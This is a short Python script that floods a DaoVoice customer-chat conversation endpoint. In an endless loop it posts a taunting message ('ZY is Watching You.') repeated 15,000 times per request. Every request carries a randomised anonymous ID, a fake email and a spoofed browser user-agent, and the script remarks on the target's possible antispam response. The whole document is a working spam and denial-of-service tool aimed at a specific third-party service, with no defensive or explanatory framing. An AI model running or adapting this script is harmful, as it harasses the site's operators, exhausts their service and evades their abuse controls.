#!/usr/bin/env python

import requests
import json
import random

def random_char():
    CHARSET = "abcdefghijklmnopqrstuvwxyz1234567890"
    return random.choice(CHARSET)

def random_id():
    s = [random_char() for i in range(0, 36)]
    s[8] = "-"
    s[13] = "-"
    s[18] = "-"
    s[23] = "-"

    return "".join(s)

def generate_data(message):
    REPEAT_TIMES = 15000
    message *= REPEAT_TIMES
    payload = {"body":"","created_at":"2017-02-11T11:29:22.126Z","referer":"http://ruanx.pw/","app_id":"e4426d97","people":{"anonymous_id":"","email":"zz@funk.com"}}
    payload["body"] = message
    payload["people"]["anonymous_id"] = random_id()
    headers = {
        "user-agent":  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
    }

    return (payload, headers)

def post(message):
    payload, headers = generate_data(message)

    r = requests.post("https://im.daovoice.io/v1/conversations/674e7db2-e80c-4d9f-9186-653302c73d6c/reply",
            headers=headers, data=json.dumps(payload))

    if r.status_code != 200:
        print("(warn) Bad request. Maybe someone has started to antispam.")
    else:
        print("(info) Successful sending.")

while True:
    post("ZY is Watching You.\n")
